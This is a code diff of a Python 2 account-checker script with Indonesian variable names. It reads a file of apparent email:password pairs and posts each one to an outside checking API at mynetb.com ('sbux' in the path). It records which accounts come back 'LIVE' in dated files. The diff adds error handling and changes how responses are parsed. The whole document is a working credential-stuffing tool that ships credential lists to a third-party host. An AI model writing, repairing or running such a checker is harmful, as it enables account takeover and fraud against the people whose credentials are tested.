@@ -48,27 +48,26 @@ openfile = open(tanya, 'r')
 url = 'http://mynetb.com/api/sbux/api.php'
 start_time = time.time()
 for i in openfile:
-    r = requests.post(url, data={'mailpass':i}, verify=False)
-    # print r.text
-    res = json.loads(r.text.replace('\n', ''))
-    if "LIVE" in res['msg']:
-        print warna.OKGREEN + res['msg'] + warna.ENDC
-        live = res['msg']
+    try:
+        r = requests.post(url, data={'mailpass':i}, verify=False)
+    except requests.exceptions.ConnectionError:
+        print "[TIMEOUT]", i
+    if "LIVE" in r.text:
+        print warna.OKGREEN + r.text + warna.ENDC
+        live = r.text
         tanggal = datetime.today()
         dtwithoutseconds = tanggal.replace(second=0, microsecond=0)
         date = str(dtwithoutseconds).replace(':', '_').replace(' ', '_')
         filename = u"LIVE-%s.txt"%date
-        # filename = slugify(filename)
         save = open(filename, 'a')
         save.write(str(live)+'\n')
         save.close()
-    elif "DIE" in res['msg']:
-        print warna.FAIL + res['msg'] + warna.ENDC
-    elif "UNCHECKED" in res['msg']:
+    elif "DIE" in r.text:
+        print warna.FAIL + r.text + warna.ENDC
+    elif "UNCHECKED" in r.text:
         print warna.WARNING + "UNCHECKED" + i + warna.ENDC
     else:
         print "Unknown Error, please contact admin"
-        exit()
 elapsed_time = time.time() - start_time
 print "[+] Job Done!"
 print "[+] Total Time: ",elapsed_time
